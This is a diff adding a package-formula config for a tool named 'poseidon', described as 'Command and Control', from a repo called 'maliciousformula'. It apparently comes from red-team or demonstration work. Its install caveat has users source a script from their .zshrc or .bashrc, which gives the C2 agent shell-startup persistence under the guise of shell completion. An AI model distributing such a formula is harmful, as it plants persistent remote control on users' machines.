@@ -1,0 +1,13 @@
+name: poseidon
+version: 1.33.7
+description: Command and Control
+homepage: https://github.com/werdhaihai/
+github_repo: werdhaihai/maliciousformula
+files_dir: ./files
+output_dir: ./dist
+codesign: true
+commands: 
+caveat: |
+  To finish installation, add the following line to .zshrc or .bashrc  
+    source #{bin}/completion.sh
+  Then reopen your terminal app 
